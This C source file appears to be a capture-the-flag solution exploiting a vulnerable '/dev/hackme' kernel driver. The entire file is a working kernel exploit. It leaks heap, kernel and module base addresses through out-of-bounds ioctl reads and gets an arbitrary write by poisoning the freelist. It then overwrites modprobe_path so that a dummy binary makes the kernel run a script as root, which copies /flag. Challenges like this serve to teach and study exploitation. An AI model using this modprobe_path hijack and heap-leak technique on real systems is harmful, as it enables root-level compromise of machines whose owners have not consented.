#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

struct user_heap
{
    size_t index;
    char *ptr;
    size_t size;
    size_t offset;
};


void add(int fd, size_t index, char *ptr, size_t size)
{
    struct user_heap heap;
    heap.index = index;
    heap.ptr = ptr;
    heap.size = size;
    ioctl(fd, 0x30000, &heap);
}


void delete(int fd, size_t index)
{
    struct user_heap heap;
    heap.index = index;
    ioctl(fd, 0x30001, &heap);
}


void edit(int fd, size_t index, char *ptr, size_t size, size_t offset)
{
    struct user_heap heap;
    heap.index = index;
    heap.ptr = ptr;
    heap.size = size;
    heap.offset = offset;
    ioctl(fd, 0x30002, &heap);
}


void show(int fd, size_t index, char *ptr, size_t size, size_t offset)
{
    struct user_heap heap;
    heap.index = index;
    heap.ptr = ptr;
    heap.size = size;
    heap.offset = offset;
    ioctl(fd, 0x30003, &heap);
}


int main()
{
    int fd = open("/dev/hackme", 0);
    size_t heap_addr, vmlinux_base, mod_tree_addr, ko_base, pool_addr, modprobe_path_addr;
    char *mem = malloc(0x100);
    memset(mem, 'A', 0x100);
    add(fd, 0, mem, 0x100);
    add(fd, 1, mem, 0x100);
    add(fd, 2, mem, 0x100);
    add(fd, 3, mem, 0x100);
    add(fd, 4, mem, 0x100);
    delete(fd, 1);
    delete(fd, 3);
    show(fd, 4, mem, 0x100, -0x100);
    heap_addr = ((size_t *)mem)[0] - 0x100;
    show(fd, 0, mem, 0x100, -0x100);
    vmlinux_base = ((size_t *)mem)[5] - 0x849ae0;
    mod_tree_addr = vmlinux_base + 0x811000;
    modprobe_path_addr = vmlinux_base + 0x83f960;
    printf("[+] heap addr: %p.\n", heap_addr);
    printf("[+] vmlinux base: %p.\n", vmlinux_base);
    printf("[+] mod_tree addr: %p.\n", mod_tree_addr);
    printf("[+] modprobe_path addr: %p.\n", modprobe_path_addr);

    memset(mem, 'B', 0x100);
    ((size_t *)mem)[0] = mod_tree_addr + 0x50;
    edit(fd, 4, mem, 0x100, -0x100);
    memset(mem, 'B', 0x100);
    add(fd, 5, mem, 0x100);                         // 3
    add(fd, 6, mem, 0x100);                         // mod_tree
    show(fd, 6, mem, 0x40, -0x40);
    ko_base = ((size_t *)mem)[0] - 0x2338;
    pool_addr = ko_base + 0x2400;
    printf("[+] ko base: %p.\n", ko_base);
    printf("[+] pool addr: %p.\n", pool_addr);

    delete(fd, 2);
    delete(fd, 5);
    ((size_t *)mem)[0] = pool_addr + 0xc0;
    edit(fd, 4, mem, 0x100, -0x100);
    add(fd, 7, mem, 0x100);                         // 3
    add(fd, 8, mem, 0x100);                         // &pool[0xc]
    ((size_t *)mem)[0] = modprobe_path_addr;
    ((size_t *)mem)[1] = 0x100;
    edit(fd, 8, mem, 0x10, 0);

    strncpy(mem, "/home/pwn/copy.sh\0", 18);
    edit(fd, 0xc, mem, 18, 0);
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
    system("chmod +x /home/pwn/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/sir");
    system("chmod +x /home/pwn/sir");
    system("/home/pwn/sir");
    system("cat /home/pwn/flag");
    // getchar();
    return 0;
}
